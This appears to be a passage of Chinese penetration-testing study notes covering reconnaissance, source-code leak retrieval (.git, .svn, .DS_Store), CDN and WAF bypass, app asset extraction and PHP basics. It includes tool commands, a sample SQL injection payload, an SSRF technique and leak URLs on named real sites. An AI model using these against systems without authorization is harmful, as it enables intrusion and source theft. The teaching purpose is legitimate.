<h2 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CDN（Content Delivery Network）是一种分布式网络架构，旨在提供高性能、可扩展的内容传输和交付服务。CDN</span><br><span class="line">的目标是加快网站和应用程序的内容传输速度，减少延迟并提供更好的用户体验。</span><br><span class="line"></span><br><span class="line">CDN 的工作原理如下：</span><br><span class="line"></span><br><span class="line">缓存：CDN 在全球各地部署了多个边缘节点服务器，这些服务器上有大容量的缓存存储。原始内容（如网页、图像、视频等）会被缓存在这些服务器上。</span><br><span class="line">路由：当用户请求访问某个资源时，请求会被智能路由到距离用户最近的边缘节点服务器。</span><br><span class="line">加速交付：边缘节点服务器提供缓存的内容，直接向用户提供所需的资源，而不必每次都从源服务器获取。这样可以显著减少网络延迟，并提高内容的传输速度和响应时间。</span><br><span class="line">负载均衡：CDN 可以根据流量负载和网络拥塞情况自动选择最佳的边缘节点来处理请求，确保高可用性和稳定性。 CDN的优点包括：</span><br><span class="line"></span><br><span class="line">加速网站和应用程序的内容传输速度，提供更好的用户体验。 减轻源服务器的负载，提高可扩展性和稳定性。</span><br><span class="line">提供全球范围的网络覆盖，确保内容在用户附近的节点上提供。</span><br><span class="line">CDN广泛应用于网站、应用程序、媒体流等领域，许多知名的互联网公司和服务提供商都使用CDN来提供快速、高效的内容交付。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">负载均衡（LoadBalancing）是一种在计算机网络中分配工作负载的方法，通过将请求均匀地分发到多个服务器或资源上，以提高系统的性能、可靠性和可扩展性。</span><br><span class="line">负载均衡的主要目标是避免单个服务器过载，并确保每个服务器都能够有效地处理请求。它可以通过以下方式实现：</span><br><span class="line">请求分发：负载均衡器接收到来自客户端的请求，并将其分发给后端的多个服务器。这个过程可以基于不同的算法，如轮询、最少连接、权重等，以确保请求平均地分布到各个服务器上。</span><br><span class="line">健康检查：负载均衡器会周期性地对后端服务器进行健康状态检查，以确保它们正常运行。如果某个服务器出现故障或不可用，负载均衡器将自动将请求转发到其他可用的服务器上。</span><br><span class="line">扩展性：当系统负载增加时，可以向负载均衡器添加更多的服务器，以满足不断增长的请求。负载均衡器将自动将流量分发到新添加的服务器上，从而提高系统的容量和性能。</span><br><span class="line">负载均衡在许多应用场景中发挥关键作用，如网站和应用程序的高可用性、流量管理、提高系统吞吐量等。常见的负载均衡技术包括硬件负载均衡器、软件负载均衡器和云平台提供的负载均衡服务。</span><br></pre></td></tr></table></figure>

<h1 id="第6天：信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取"><a href="#第6天：信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取" class="headerlink" title="第6天：信息打点-Web架构篇&amp;域名&amp;语言&amp;中间件&amp;数据库&amp;系统&amp;源码获取"></a>第6天：信息打点-Web架构篇&amp;域名&amp;语言&amp;中间件&amp;数据库&amp;系统&amp;源码获取</h1><p>知识点：</p>
<p>1、打点-Web架构-语言&amp;中间件&amp;数据库&amp;系统等</p>
<p>2、打点-Web源码-CMS开源&amp;闭源售卖&amp;自主研发等</p>
<p>3、打点-Web源码获取-泄露安全&amp;资源监控&amp;其他</p>
<p>4、打点-Web域名-子域名&amp;反查域名&amp;旁注等</p>
<p>信息点：</p>
<p>基础信息，系统信息，应用信息，防护信息，人员信息，其他信息等</p>
<p>技术点：</p>
<p>CMS识别，端口扫描，CDN绕过，源码获取，子域名查询，WAF识别，负载均衡识别等</p>
<h1 id="第7天：信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份"><a href="#第7天：信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份" class="headerlink" title="第7天：信息打点-资产泄漏&amp;CMS识别&amp;Git监控&amp;SVN&amp;DS_Store&amp;备份"></a>第7天：信息打点-资产泄漏&amp;CMS识别&amp;Git监控&amp;SVN&amp;DS_Store&amp;备份</h1><p>知识点：<br>1、CMS指纹识别源码获取方式<br>2、习惯&amp;配置&amp;特性等获取方式<br>3、托管资产平台资源搜索监控</p>
<p>详细点：<br>参考：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a><br>源码泄漏原因：<br>1、从源码本身的特性入口<br>2、从管理员不好的习惯入口<br>3、从管理员不好的配置入口<br>4、从管理员不好的意识入口<br>5、从管理员资源信息搜集入口</p>
<p>源码泄漏集合：<br>composer.]son<br>git源码泄露<br>svn源码泄露<br>hg源码泄漏<br>网站备份压缩文件<br>WEB-INF&#x2F;web.m1泄露<br>DS Store文件泄露<br>SWP文件泄露<br>CVS泄露<br>Bzr泄露<br>GitHub源码泄漏</p>
<p>演示案例：<br>直接获取-CMS识别-云悉指纹识别平台<br>（yunsee.cn 在线指纹识别平台）<br>习惯不好备份文件-某黑阔博客源码泄漏<br>（网站管理员将网站备份到网站目录下造成源码泄露）<br>配置不当-GIT泄漏某程序员博客源码泄漏<br>参考链接：<a target="_blank" rel="noopener" href="https://codeleading.com/article/54926468941/">https://codeleading.com/article/54926468941/</a><br>利用工具：<a target="_blank" rel="noopener" href="https://github/lijiejie/GitHack">https://github/lijiejie/GitHack</a></p>
<p>当在一个空目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了<br>比如某个网站存在.git文件泄露，可以：<br>利用方式：<br>github上的githack可以把整个.git备份的文件下载下来。它能解析 .git&#x2F;index 文件，并找到工程中所有的：文件名和文件 sha1，然后去 .git&#x2F;objects&#x2F; 文件夹下下载对应的文件，通过 zlib 解压文件，按原始的目录结构写入源代码<br>配置不当-SVN泄漏-某国外小伙子源码泄漏<br>SVN 是 Subversion 的简称，是一个开放源代码的版本控制系统，相较于 RCS、CVS，它采用了分支管理系统，它的设计目标就是取代 CVS。互联网上很多版本控制服务已从 CVS 迁移到 Subversion。<br>很多网站都使用了 svn 版本控制系统，和使用 git 版本控制器类似，很多开发者网站安全意识不足，代码放到生产坏境中后，没有清理 svn 的一些信息，导致 svn 残留，因此攻击者可以使用工具 dvcs-ripper 下载网站源码。<br>当可以访问到&#x2F;.svn&#x2F;entries的时候，就证明存在了。<br>比如乌云曾经爆出的某个网站：</p>
<p><a target="_blank" rel="noopener" href="http://data.5i5j.com/sitemetrics/.svn/entries">http://data.5i5j.com/sitemetrics/.svn/entries</a><br>利用工具 <a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>工具命令 rip-svn.pl -v -u <a target="_blank" rel="noopener" href="http://www.localhost.test/.svn/">http://www.localhost.test/.svn/</a></p>
<p>配置不当-DS Store泄漏-某开发Mac源码泄漏<br>.DS_Store 文件 MAC 系统是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。如果用户删除以后的副作用就是这些信息的失去。</p>
<p>这些文件本来是给 Finder 使用的，但它们被设想作为一种更通用的有关显示设置的元数据存储，诸如图标位置和视图设置。 当你需要把代码上传的时候，安全正确的操作应该把 .DS_Store 文件删除才正确。通过.DS_Store可以知道这个目录里所有的文件名称。</p>
<p>当访问&#x2F;.ds_store可以访问的到，就证明存在。例如：</p>
<p><a target="_blank" rel="noopener" href="http://www.baidu.com/.ds_store">http://www.baidu.com/.ds_store</a></p>
<p>工具:<a target="_blank" rel="noopener" href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p>
<p>使用方式：</p>
<p>python ds_store_exp.py <a target="_blank" rel="noopener" href="http://www.example.com/.DS_Store">http://www.example.com/.DS_Store</a></p>
<p>PHP特性-composer.json泄漏-某直接搭建源码泄漏</p>
<p>例如：<a target="_blank" rel="noopener" href="http://57.128.195.180/composer.json">http://57.128.195.180/composer.json</a></p>
<blockquote>
<p>下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava</p>
<p>解题思路：访问靶场通过控制filename来任意文件下载</p>
<p>因为WEB-INF会存储配置文件，所以构造filename&#x3D;WEB-INF&#x2F;web.xml,此文件会记录源码的结构</p>
<p>访问文件内容，并构造文件名下载</p>
<p>最后通过反编译出flag</p>
</blockquote>
<blockquote>
<p>资源监控-GITHUB泄漏-语法搜索&amp;关键字搜索&amp;社工<br>通过github和google hack语法搜索相关信息<br>相关利用项目：</p>
<p>cMs识别：<a target="_blank" rel="noopener" href="https://www.yunsee.cn/">https://www.yunsee.cn/</a> 备份：敏感目录文件扫描 -7 kbscan-WebPathBrute<br>CVS:<a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>GIT:<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>SVN:<a target="_blank" rel="noopener" href="https://github.com/callmefeifei/SvnHack_DS">https://github.com/callmefeifei/SvnHack_DS</a><br>Store:<a target="_blank" rel="noopener" href="https://github.com/lijiejie/ds_stor_exp">https://github.com/lijiejie/ds_stor_exp</a></p>
</blockquote>
<blockquote>
<p>GITHUB资源搜索：<br>in:name test #仓库标题搜索含有关键字<br>in:descripton test #仓库描述搜索含有关键字<br>in:readme test #Readme文件搜素含有关键字<br>stars:&gt;3000 test #stars数量大于3000的搜索关键字</p>
</blockquote>
<h1 id="第8天-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙"><a href="#第8天-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙" class="headerlink" title="第8天 信息打点-系统篇&amp;端口扫描&amp;CDN服务&amp;负载均衡&amp;WAF防火墙"></a>第8天 信息打点-系统篇&amp;端口扫描&amp;CDN服务&amp;负载均衡&amp;WAF防火墙</h1><p>知识点：<br>1、获取网络信息-服务厂商&amp;网络架构<br>2、获取服务信息-应用协议&amp;内网资产<br>3、获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙</p>
<p>详细点：<br>CDN服务，WAF防火墙，负载均衡，防火墙阻碍</p>
<p>演示案例：<br>1、网络信息获取-服务厂商&amp;网络架构<br>通过域名信息查询获取 IP、云服务厂商、域名出售厂商、注册者邮箱等信息（可以使用威胁情报平台）</p>
<p>2、服务信息获取-协议应用&amp;内网资产<br>旁注：查询同一服务器下的不同WEB应用<br>C段：查询同一网段下，不同服务器部署的不同WEB应用<br>nmap target -Pn -osscan-limit -sV</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-Pn：不检测主机存活 -osscan-limit:扫操作系统 </span><br><span class="line"></span><br><span class="line">-sV：探测打开的端口以确定服务/版本信息</span><br></pre></td></tr></table></figure>

<p>3、阻碍信息获取-CDN&amp;WAF&amp;负载&amp;防火墙<br>超级ping:CDN服务识别（全国个地去ping目标地址，看访问的IP地址是否不同）<br>wafw00f识别waf、看图识别</p>
<p>4、ldb识别负载均衡</p>
<p>使用工具去检测负载均衡是否存在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#相关利用项目：</span><br><span class="line">Masscan:https://github.com/robertdavidgraham/masscan</span><br><span class="line">Wafwoof:https://github.com/Enablesecurity/wafw00f</span><br><span class="line">Kali上自带Nmap,Masscan,lbd等项目，超级ping:ping.chinaz.com</span><br><span class="line">超级ping:CDN服务识别</span><br><span class="line">Masscan:端口扫描，应用协议</span><br><span class="line">Wafw00f:Web应用防护防火墙识别</span><br><span class="line">namp：端口扫描，应用协议，防火墙识别</span><br><span class="line">lbd:负载均衡，广域网负载均衡，应用层负载均衡</span><br></pre></td></tr></table></figure>



<h1 id="第9天-信息打点-CDN烧过篇-漏洞回链8接口探针-全网扫指-反向件"><a href="#第9天-信息打点-CDN烧过篇-漏洞回链8接口探针-全网扫指-反向件" class="headerlink" title="第9天 信息打点-CDN烧过篇&amp;漏洞回链8接口探针&amp;全网扫指&amp;反向件"></a>第9天 信息打点-CDN烧过篇&amp;漏洞回链8接口探针&amp;全网扫指&amp;反向件</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">知识点：</span><br><span class="line">1、CDN知识-工作原理及阻碍</span><br><span class="line">2、CDN配置-域名&amp;区域&amp;类型</span><br><span class="line">3、CDN绕过-靠谱十余种技战法</span><br><span class="line">4、CDN绑定-HOSTS绑定指向访问</span><br></pre></td></tr></table></figure>

<blockquote>
<p>CDN 是构建在数据网络上的一种分布式的内容分发网。 CDN的作用是采用流媒体服务器集群技术，克服单机系统输出带宽及并发能力不足的缺点，可极大提升系统支持的并发流数目，减少或避免单点失效带来的不良影响。</p>
</blockquote>
<p>#前置知识<br>1.传统访问：用户访问域名-&gt;解析服务器IP-&gt;访问目标主机<br>2.普通CDN:用户访问域名-&gt;CDN节点-&gt;真实服务器IP-&gt;访问目标主机<br>3.带WAF的CDN:用户访问域名-&gt;CDN节点(WAF)-&gt;真实服务器IP-&gt;访问目标主机</p>
<p>CDN的使用:在阿里云平台上去进行按每一步配置即可。</p>
<p>#判定标准：<br>nslookup,各地ping(出现多个IP即启用CDN服务)<br>#参考知识：<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/33440472">https://zhuanlan.zhihu.com/p/33440472</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/blacksunny/p/5771827.html">https://www.cnblogs.com/blacksunny/p/5771827.html</a><br>子域名，去掉www,邮件服务器，国外访问，证书查询，APP抓包<br>黑暗空间引擎（yofo），通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">演示案例：</span><br><span class="line">真实应用-CDN绕过-漏洞&amp;遗留文件</span><br><span class="line">原理： 利用ssrf使得服务器主动请求VPS地址，此时通过在VPS地址监听请求即可得知真实地址。（相当于目标服务器主动请求VPS地址，vps会监听到真实地址）</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-子域名查询操作</span><br><span class="line">原理：配置CDN时管理员考虑费用问题可能会将子域名排除在外，此时通过手机子域名信息即可得到真实地址（用于子域名应用和根域名应用部署在同一服务器的情况下）</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-接口查询国外访问</span><br><span class="line">原理：配置CDN时选择地域可能会仅设置成国内生效，此时使用国外地址访问获得真实地址</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-主动邮件配合备案</span><br><span class="line">原理:通过系统功能（如：密码找回发送邮件，查看邮件发送方地址找寻），通过备案信息确认，一般是通过备案的地点去判定</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-全网扫描FuckCDN</span><br><span class="line">原理：扫描全球ip匹配web内容，实用工具匹配扫描网段title信息。需要大量时间很多情况下，不过也是最稳定的方法。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#参考知识：</span><br><span class="line">https://zhuanlan.zhihu.com/p/33440472</span><br><span class="line">https://www.cnblogs.com/blacksunny/p/5771827.html</span><br><span class="line">子域名，去掉www,邮件服务器，国外访问，证书查询，APP抓包</span><br><span class="line">黑暗空间引擎，通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</span><br><span class="line">#案例资源：</span><br><span class="line">超级Ping:https://www.17ce.com/</span><br><span class="line">接口查询：https://get-site-ip.com/</span><br><span class="line">国外请求：https://tools.ipip.net/cdn.php</span><br><span class="line">全网扫描：https://github.com/Tai7sy/fuckcdn</span><br></pre></td></tr></table></figure>

<h1 id="第10天-信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取"><a href="#第10天-信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取" class="headerlink" title="第10天 信息打点-APP&amp;小程序篇&amp;抓包封包&amp;XP框架&amp;反编译&amp;资产提取"></a>第10天 信息打点-APP&amp;小程序篇&amp;抓包封包&amp;XP框架&amp;反编译&amp;资产提取</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#### 知识点：</span><br><span class="line"></span><br><span class="line">1、小程序-外在-资产收集</span><br><span class="line">2、APP-外在&amp;内在-资产收集</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#### 演示案例：</span><br><span class="line"></span><br><span class="line">APP-外在抓包-Fd&amp;茶杯&amp;Burp</span><br><span class="line"></span><br><span class="line">APP-外在封包-封包监听工具</span><br><span class="line">使用封包监听也可抓到数据包</span><br></pre></td></tr></table></figure>

<p>APP-内在提取-ApplnfoScanner</p>
<blockquote>
<p>一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。</p>
</blockquote>
<p>APP-内在搜索-反编译载入IDEA</p>
<ul>
<li>APP-资源提取-安装泡&amp;资源文件<br>使用安卓修改大师导入apk文件，可对域名资源进行收集</li>
</ul>
<p>​	还可使用IDEA对反编译出的项目进行资源收集</p>
<ul>
<li>APP-框架使用-Xposed&amp;JustTrustMe</li>
</ul>
<p>某些apk存在加壳的情况，会扫描失败，可以通过工具判断apk是否加壳</p>
<p>可通过安装xp框架的方式进行脱壳处理</p>
<p>小程序-微信-电脑版登录启动抓包分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">APP安卓入手</span><br><span class="line">1、外在-抓包封包-资产安全测试</span><br><span class="line">资产收集-资源提取-ICO,MD5,HASH-黑暗引擎搜索相关资产</span><br><span class="line">2、外在-功能逻辑</span><br><span class="line">3、内在-反编译-JAVA代码代码审计</span><br><span class="line">4、内在-反编译-提取RES资源-黑暗资产收集</span><br></pre></td></tr></table></figure>

<h1 id="第11天信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Ar灯塔"><a href="#第11天信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Ar灯塔" class="headerlink" title="第11天信息打点-红队工具篇&amp;Fofa&amp;Quake&amp;Kunyu&amp;Suize水泽&amp;Ar灯塔"></a>第11天信息打点-红队工具篇&amp;Fofa&amp;Quake&amp;Kunyu&amp;Suize水泽&amp;Ar灯塔</h1><p>知识点：<br>1、网络空间四大引擎-Fofa&amp;Quake&amp;shodan&amp;2 oomeye I<br>2、自动化信息收集项目-ARL灯塔&amp;Suize水泽s Kunyui坤舆<br>3、单点功能信息收集项目-企查：子域名指纹识别：社工信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">##黑暗引擎：</span><br><span class="line">https://fofa.so</span><br><span class="line">https://quake.360.cn</span><br><span class="line">https://www.shodan.io</span><br><span class="line">https://www.zoomeye.org</span><br><span class="line">##自动项目：</span><br><span class="line">https://github.com/knownsec/Kunyu</span><br><span class="line">https://github.com/0x727/shuize 0x727</span><br><span class="line">https://github.com/TophantTechnology/ARL</span><br><span class="line">##相关资源：</span><br><span class="line">https://forum.ywhack.com/center.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、演示案例：网络空间-Fofa&amp;Quake&amp;Shodan&amp;Zoomeye</span><br><span class="line">工具测评网络空间四大黑暗彩擎集合版项目</span><br><span class="line">finger:通过调用zoomeyes和fofa的接口实现</span><br><span class="line">	通过fofa和zoomeyes两个接口去进行信息搜集</span><br><span class="line">2工具测评-自动化收集-ARL灯塔&amp;Suize水泽&amp;Kunyu</span><br><span class="line">Kunyu：通过调用zoomeyes API实现资产信息和漏洞信息收集 还能够通过一个api去进行相关漏洞的搜集</span><br><span class="line">ARL灯塔：自动化信息收集工具</span><br><span class="line">水泽Suize：认为是暂时最好用的一个工具，能够搜集到更加全面的信息。</span><br><span class="line">3、工具测评-单点功能器企查查&amp;子域名&amp;指纹识别&amp;社工</span><br><span class="line">相比自动化全部搜集的工具，所能搜集到的信息更加准确，但都是同一个方面的。</span><br><span class="line">上述工具都可以在菱角社区去找到。</span><br></pre></td></tr></table></figure>

<h1 id="第12天：PHP开发-个人博客项目-文章功能显示-数据库操作-数据接受"><a href="#第12天：PHP开发-个人博客项目-文章功能显示-数据库操作-数据接受" class="headerlink" title="第12天：PHP开发-个人博客项目_文章功能显示_数据库操作_数据接受"></a>第12天：PHP开发-个人博客项目_文章功能显示_数据库操作_数据接受</h1><p>接下来几天就都是PHP相关的知识，但是由于现在的社会环境，PHP语言的逐渐淘汰，所以PHP的相关笔记就粗略大概过一遍。</p>
<p>首先ctf中注意的是php中的单双引号的区别，单引号不解析变量，双引号能够解析变量</p>
<p>知识点：<br>1、PHP入门-语法&amp;提交等<br>2、MsQL入门-数据库操作<br>3、HTML+CS5入门-样式编排</p>
<p>演示案例：<br>小迪博客文章阅读功能初步实现</p>
<p>实现功能：<br>前端文章导航，点入内容显示，更改I♪显示不同内容<br>实现步骤：<br>1、前端页面显示编写-HTML&amp;CSS<br>HTML 是一种用于创建网页的标记语言，全称为超文本标记语言。使用html构造显示前端文章导航站点。</p>
<p>2、数据库文章数据导入-MySQL工操作<br>首先配置数据库连接–验证数据库配置–定义数据查询到的变量并赋值–连接具体表–执行具体字段显示</p>
<p>每次查询数据时都需要执行核查数据库配置的语句所以可以把数据库连接配置写成配置文件</p>
<p>3、PHP操作MYSQL编写-PHP变量提交<br>要实现提交一个参数传到数据库中查询，需要先通过GET获取提交的参数，然后通过数据库语法（where id &#x3D; ?）指定查询内容(此处因为没有对传入的参数进行限制就导致了sql注入，例如where id&#x3D;1 union select name from admin)</p>
<p>除了使用GET传参外，还可以使用PSOT和REQUEST传参，这样就是sql注入中的get方式和post方式注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">组件：</span><br><span class="line">Navicat:操作数据库</span><br><span class="line">Dreamweaver:前端页面设计</span><br><span class="line">PhpStorm:PHP开发IDE</span><br><span class="line">phpStudy:PHP搭建环境</span><br></pre></td></tr></table></figure>

<h1 id="第13天-PHP开发个人博客项目8-文件操作类-编辑器-上传下载删除读写"><a href="#第13天-PHP开发个人博客项目8-文件操作类-编辑器-上传下载删除读写" class="headerlink" title="第13天 PHP开发个人博客项目8&amp;文件操作类&amp;编辑器&amp;上传下载删除读写"></a>第13天 PHP开发个人博客项目8&amp;文件操作类&amp;编辑器&amp;上传下载删除读写</h1><h4 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h4><p>1、文件操作类代码编写<br>2、文件上传&amp;下载&amp;删除</p>
<p>3、文件内容&amp;读取&amp;写入<br>4、第三方编辑器引用实例</p>
<h4 id="演示案例：小迪博客-文件操作-上传-下载-删除-读取-写入等"><a href="#演示案例：小迪博客-文件操作-上传-下载-删除-读取-写入等" class="headerlink" title="演示案例：小迪博客-文件操作&amp;上传&amp;下载&amp;删除&amp;读取&amp;写入等"></a>演示案例：小迪博客-文件操作&amp;上传&amp;下载&amp;删除&amp;读取&amp;写入等</h4><p>#文件上传类：-任意文件上传<br>1、代码自主写<br>2、外部编辑器源码引用<br>3、开发框架引用</p>
<p>#文件下载类：-任意文件下载<br>1、直连URL访问<br>2、传参头部修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">直连下载会暴露文件存储路径，如果服务器端的文件存储路径包含敏感信息，建议使用 PHP 内置的 readfile()函数来直接输出文件内容，以避免泄露敏感信息。同时，可以设置响应头信息中的 Content-Disposition 属性为inline，使浏览器将文件直接显示在页面中，而不是下载到本地。</span><br><span class="line">传参下载可能存在参数注入攻击的风险，因此在接收和处理来自客户端的参数时，应该对输入值进行过滤和验证，避免恶意用户利用特殊字符或脚本代码等手段构造攻击请求。例如，可以使用</span><br><span class="line">PHP 内置的 filter_input() 函数来对参数值进行过滤，或使用正则表达式来匹配合法的参数格式。</span><br><span class="line">在下载文件之前，应该对用户身份进行验证，确保只有具备相应权限的用户才能访问和下载文件。例如，在使用传参下载时，可以检查用户的登录状态和角色权限，避免未经授权的下载操作。</span><br><span class="line">对于需要下载的文件，建议对其类型、大小、来源和安全性等进行检查和限制，避免下载恶意软件、病毒或大型文件等对服务器端和客户端带来的负担和安全威胁。例如，可以使用</span><br><span class="line">PHP 内置的 mime_content_type() 函数检查文件 MIME 类型，或使用 filesize() 函数检查文件大小，并在前端添加文件大小限制。对于上传到服务器的文件，可以使用防病毒软件和防火墙等工具对文件进行检查和过滤。</span><br><span class="line">//http://www.xiaodi.com/soft/软件.zip</span><br><span class="line">//http://www.xiaodi.com/soft/down.php?filename=.zip</span><br></pre></td></tr></table></figure>

<p>#文件删除类-任意文件删除1、文件删除<br>2、文件夹删除<br>删除文件使用unlink()函数，删除文件夹使用rmdir()函数。</p>
<p>#文件内容操作类-任意文件读取&amp;写入<br>1、文件读取<br>2、文件写入</p>
<p>文件包含漏洞<br>1、本地文件包含<br>2、远程文件包含<br>web漏洞核心<br>1、可控变量<br>2、特定函数</p>
<h1 id="第14天-PHP开发-个人博客项目8输入输出类-留言板8访问IP-UA头来源"><a href="#第14天-PHP开发-个人博客项目8输入输出类-留言板8访问IP-UA头来源" class="headerlink" title="第14天 PHP开发-个人博客项目8输入输出类&amp;留言板8访问IP&amp;UA头来源"></a>第14天 PHP开发-个人博客项目8输入输出类&amp;留言板8访问IP&amp;UA头来源</h1><h4 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h4><h5 id="1、PHP-全局变量-SERVER"><a href="#1、PHP-全局变量-SERVER" class="headerlink" title="1、PHP-全局变量_SERVER"></a>1、PHP-全局变量_SERVER</h5><p>利用全局变量可以查看服务器和执行环境信息</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">一些PHP中的全局变量</span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REMOTE_PORT&#x27;] //端口。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REMOTE_ADDR&#x27;] //当前用户 IP</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REMOTE_HOST&#x27;] //当前用户主机名 </span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_NAME&#x27;] //服务器主机的名称。</span></span><br><span class="line"><span class="comment">// 